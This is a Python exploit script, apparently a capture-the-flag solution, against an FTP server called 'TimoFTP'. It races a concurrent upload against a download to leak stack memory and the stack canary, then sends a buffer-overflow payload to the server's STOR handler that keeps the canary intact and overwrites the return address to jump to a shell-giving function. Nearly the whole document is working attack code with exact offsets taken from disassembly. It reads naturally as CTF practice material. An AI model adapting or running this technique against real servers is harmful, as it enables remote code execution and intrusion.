#!/usr/bin/python

from gogo_header import *
import sys

if len(sys.argv) != 3:
    print "[*] usage : gogo.py [IP] [PORT]"
    sys.exit(1)


r = remote(sys.argv[1],sys.argv[2],level='error')
r.recvuntil('220 (TimoFTP)')
dologin(r)


# 1st stage : First of all, send temp file for exploit
l = portModeSend(r,4444)
doPut(r)
sendData(r, l, 21, "TEMP FILE FOR EXPLOIT")


# 2nd stage : Overwrite TEMP FILE to enlarge size
l = portModeSend(r,4444)
doGet(r)
pid = fork()
if pid == 0:                        
        r2 = remote(sys.argv[1],sys.argv[2],level='error')
        r2.recvuntil('220 (TimoFTP)')
        dologin(r2)
        l2 = portModeSend(r2,4446)
        doPut(r2)
        sendData(r2, l2, 2000, "A"*2000) # size = 2000
        l2.close()
        r2.close()


else:                                         
# 3rd stage : receive leaked stack info from server
        recvdata = getData(r, l, 2000)   # size = 2000
 
        # IDA view of [Server::do_retr]
        #       char buf[112];           // [rbp-2A0h]
        #       unsigned __int64 canary; // [rbp-18h]
        canary = recvdata[0x2A0-0x18:0x2A0-0x18+0x8]


# 4th stage : trigger BOF bug on Server::do_stor.
        l = portModeSend(r,4444)
        doPut(r)
        # IDA view of [Server::do_stor]
        #       char buf[104];        //  [rbp-80h]
        #       unsigned __int64 v10; //  [rbp-18h]
        payload  = ""
        payload += "A"*(0x80 - 0x18)
        payload += canary # + 0x08
        payload += "A"*(0x10)
        payload += "BBBBBBBB"               # saved rbp   : dummy
        payload += p64(0x000000000040B37C)  # return addr : catch_shell_if_you_can()
        sendData(r, l, len(payload), payload)
        #r.interactive()
        r.recvline()
        context.log_level = "error"
        print r.recv(1000,timeout=1) # edited to get flag....
        exit(0)
